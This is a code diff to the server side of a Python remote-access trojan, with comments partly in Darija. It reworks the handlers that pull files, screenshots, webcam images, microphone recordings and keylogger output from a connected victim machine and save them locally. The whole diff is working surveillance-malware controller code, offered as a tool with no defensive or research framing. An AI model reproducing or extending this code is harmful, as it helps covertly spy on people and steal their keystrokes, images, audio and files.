@@ -1,8 +1,8 @@
 import socket
-import threading
 import base64
 import time
-
+import keyboard
+import threading
 #create socket for client connection(n9drou ndirou multiple clients !)
 def handle_client(client_socket):
 	while True:
@@ -21,49 +21,64 @@ def handle_client(client_socket):
 				command = f"upload {command.split(' ')[2]}"
 				client_socket.send(command.encode())
 				client_socket.send(encoded_data.encode())
-				output = client_socket.recv(4096).decode()
+				output = client_socket.recv(1000000).decode()
 				print(output)
 				continue
 
-			output = client_socket.recv(4096).decode()
+			output = client_socket.recv(1000000).decode()
 			
 			print(output)
 
-			if  command.startswith('download '):
+			if  command.startswith(('download', 'webcam', 'screenshot')):
 				output = base64.b64decode(output.encode())
-				filename = command[9:]
-				with open(filename, 'wb') as f:
-					f.write(output)
-				print(f"File {filename} downloaded successfully.")
-				continue
-			#keylogg still maymchich
-			if command == 'keylogger':
-				if client_socket.recv(4096).decode() == "Keylogging ...":
-					output = "Keylogging ... started on client machine."
-					print(output)
-			if command in ['screenshot', 'webcam'] or command.startswith('mic'):
-				print("[] Requesting media file...")
-				file_data_b64 = client_socket.recv(10000000).decode()
-				if file_data_b64.startswith("Error:"):
-					print(f"[-] Client reported an error: {file_data_b64}")
+				if command == 'screenshot':
+					filename = f"screenshot{int(time.time())}.png"
+				elif command == 'webcam':
+					filename = f"webcam{int(time.time())}.png"
+				elif command.startswith('mic'):
+					filename = f"microphone{int(time.time())}.wav"
 				else:
-					try:
-						file_content = base64.b64decode(file_data_b64)
-						if command == 'screenshot':
-							filename = f"screenshot{int(time.time())}.png"
-						elif command == 'webcam':
-							filename = f"webcam{int(time.time())}.png"
-						else: # mic
-							filename = f"microphone{int(time.time())}.wav"
-
-						with open(filename, 'wb') as f:
-							f.write(file_content)
-						print(f"[+] File saved as {filename}")
-					except Exception as e:
-						print(f"[-] Failed to decode or save file: {e}")
-				if output == "":
-					output = "No output received."
-					print(output)
+					filename = command[9:]
+				try:
+					with open(filename, 'wb') as f:
+						f.write(output)
+					print(f"File {filename} downloaded successfully.")
+					continue
+				except Exception as e:
+					print(f"[-] Failed to save file: {e}")
+					continue
+			#keylogg wela ymchi !
+			if command == 'mic':
+				print("\npress esq to stop microphone recording on client machine")
+				keyboard.wait("esc")
+				client_socket.send("stop".encode())
+				filename = f"microphone{int(time.time())}.wav"
+				output = client_socket.recv(1000000).decode()
+				output = base64.b64decode(output.encode())
+				try:
+					with open(filename, 'wb') as f:
+						f.write(output)
+					print(f"Audio file {filename} saved successfully.")
+					continue
+				except Exception as e:
+					print(f"[-] Failed to save audio file: {e}")
+					continue
+			if command == 'keylogger':
+				#if messege == "Keylogging ...":
+				print("\npress esq to stop keylogging on client machine")
+				keyboard.wait("esc")
+				client_socket.send("stop".encode())
+				filename = f"keylogg{int(time.time())}.txt"
+				output = client_socket.recv(1000000).decode()
+				output = base64.b64decode(output.encode())
+				try:
+					with open(filename, 'wb') as f:
+						f.write(output)
+					print(f"Keylog file {filename} saved successfully.")
+					continue
+				except Exception as e:
+					print(f"[-] Failed to save keylog file: {e}")
+					continue
 				
 				
 		except Exception as e:
@@ -96,8 +111,9 @@ def start_server():
 		print("type 'webcam' to capture webcam image from client machine")
 		print("type 'mic <duration>' to record audio from client machine")
 		print("type 'exit' to terminate the connection")
-		client_handler = threading.Thread(target=handle_client, args=(conn,))
-		client_handler.start()
+		#client_handler = threading.Thread(target=handle_client, args=(conn,))
+		#client_handler.start()
+		handle_client(conn)
 
 
 if __name__ == "__main__":
